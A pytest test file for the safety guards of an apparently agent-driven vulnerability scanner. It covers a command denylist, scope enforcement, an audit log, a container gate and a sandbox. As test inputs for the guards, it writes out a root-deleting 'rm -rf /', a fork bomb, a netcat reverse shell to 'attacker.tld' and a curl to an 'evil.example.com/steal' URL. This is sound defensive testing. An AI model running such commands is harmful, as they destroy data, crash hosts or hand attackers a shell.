"""M2 — safety core: guards, scope, audit log, sandbox."""

import json
from pathlib import Path

import pytest

from vuln_scanner.agents.audit import ActionLog
from vuln_scanner.agents.deps import AgentDeps, ContainerGateError, ScopeViolation
from vuln_scanner.agents.guards import denylist_check, extract_hosts, is_in_container
from vuln_scanner.agents.models import AgentConfig, AgentKind, AgentsConfig, SandboxConfig
from vuln_scanner.agents.sandbox import run_code_sandboxed
from vuln_scanner.scope import ScopeValidator

# ── Guards ────────────────────────────────────────────────────────────────────


def test_denylist_blocks_rm_rf_root():
    safe, reason = denylist_check("rm -rf / --no-preserve-root")
    assert safe is False
    assert "Denylist" in reason


def test_denylist_blocks_fork_bomb():
    safe, _ = denylist_check(":(){ :|: & };:")
    assert safe is False


def test_denylist_blocks_reverse_shell():
    safe, _ = denylist_check("bash -c 'nc -e /bin/sh attacker.tld 4444'")
    assert safe is False


def test_denylist_allows_benign():
    safe, _ = denylist_check("curl -s https://example.com/api | grep token")
    assert safe is True


def test_extract_hosts_from_url_and_hostport():
    hosts = extract_hosts("curl https://api.example.com/x", "smbmap -H 10.0.0.5:445")
    assert "api.example.com" in hosts
    assert "10.0.0.5" in hosts


def test_extract_hosts_strips_port():
    hosts = extract_hosts("target.local:8443")
    assert "target.local" in hosts


# ── Audit log ─────────────────────────────────────────────────────────────────


def test_action_log_writes_jsonl(tmp_path):
    alog = ActionLog(tmp_path, "hunter")
    alog.record("run_tool", tool="nmap", target="10.0.0.1", exit_code=0)
    alog.record("scope_deny", host="evil.com")
    assert alog.count == 2
    lines = alog.path.read_text().strip().splitlines()
    assert len(lines) == 2
    rec = json.loads(lines[0])
    assert rec["action"] == "run_tool"
    assert rec["tool"] == "nmap"
    assert rec["agent"] == "hunter"


# ── Scope guard ───────────────────────────────────────────────────────────────


def _deps(tmp_path, *, include=None, allowlist=None, enforcement=True) -> AgentDeps:
    scope = ScopeValidator(include=include or [], exclude=[], strict=False)
    cfg = AgentsConfig(scope_enforcement=enforcement)
    agent = AgentConfig(name="hunter", kind=AgentKind.BUG_BOUNTY)
    return AgentDeps(
        agent=agent,
        agents_cfg=cfg,
        scope=scope,
        audit=ActionLog(tmp_path, "hunter"),
        artifact_dir=tmp_path,
        allowlist=set(allowlist or []),
    )


def test_scope_allows_allowlisted_host(tmp_path):
    deps = _deps(tmp_path, allowlist={"target.lab"})
    deps.assert_in_scope("curl https://target.lab/x")  # no raise


def test_scope_denies_out_of_scope(tmp_path):
    deps = _deps(tmp_path, include=["target.lab"])
    with pytest.raises(ScopeViolation):
        deps.assert_in_scope("curl https://evil.example.com/steal")


def test_scope_allows_in_include(tmp_path):
    deps = _deps(tmp_path, include=["target.lab"])
    deps.assert_in_scope("nmap target.lab")  # no raise


def test_scope_enforcement_disabled_skips(tmp_path):
    deps = _deps(tmp_path, include=["target.lab"], enforcement=False)
    deps.assert_in_scope("curl https://anything.example.com")  # no raise


def test_scope_no_host_is_allowed(tmp_path):
    deps = _deps(tmp_path, include=["target.lab"])
    deps.assert_in_scope("print('hello world')")  # nothing to reach → ok


# ── Container gate ────────────────────────────────────────────────────────────


def test_container_gate_refuses_outside(tmp_path, monkeypatch):
    monkeypatch.delenv("VS_IN_CONTAINER", raising=False)
    assert is_in_container() is False
    deps = _deps(tmp_path)
    with pytest.raises(ContainerGateError):
        deps.require_container("run_code")


def test_container_gate_allows_inside(tmp_path, monkeypatch):
    monkeypatch.setenv("VS_IN_CONTAINER", "1")
    deps = _deps(tmp_path)
    deps.require_container("run_code")  # no raise


# ── Sandbox ───────────────────────────────────────────────────────────────────


def test_sandbox_refuses_outside_container(monkeypatch):
    monkeypatch.delenv("VS_IN_CONTAINER", raising=False)
    r = run_code_sandboxed(
        "python", "print(1)", sandbox=SandboxConfig(), allowed_languages=["python"]
    )
    assert r.blocked is True
    assert r.block_reason == "not_in_container"


def test_sandbox_blocks_disallowed_language(monkeypatch):
    monkeypatch.setenv("VS_IN_CONTAINER", "1")
    r = run_code_sandboxed(
        "ruby", "puts 1", sandbox=SandboxConfig(), allowed_languages=["python", "bash"]
    )
    assert r.blocked is True
    assert "not allowed" in r.block_reason


def test_sandbox_blocks_denylisted_code(monkeypatch):
    monkeypatch.setenv("VS_IN_CONTAINER", "1")
    r = run_code_sandboxed(
        "bash", "rm -rf / --no-preserve-root", sandbox=SandboxConfig(), allowed_languages=["bash"]
    )
    assert r.blocked is True
    assert "Denylist" in r.block_reason


def test_sandbox_runs_benign_python(monkeypatch, tmp_path):
    # Real execution of a harmless script — host-safe, container gate mocked on.
    monkeypatch.setenv("VS_IN_CONTAINER", "1")
    r = run_code_sandboxed(
        "python",
        "print('poc-marker-42')",
        sandbox=SandboxConfig(timeout=10),
        allowed_languages=["python"],
        workdir=Path(tmp_path),
    )
    assert r.blocked is False
    assert r.exit_code == 0
    assert "poc-marker-42" in r.stdout


def test_sandbox_enforces_cpu_via_timeout(monkeypatch, tmp_path):
    monkeypatch.setenv("VS_IN_CONTAINER", "1")
    r = run_code_sandboxed(
        "bash",
        "sleep 5",
        sandbox=SandboxConfig(timeout=1),
        allowed_languages=["bash"],
        workdir=Path(tmp_path),
    )
    assert r.timed_out is True
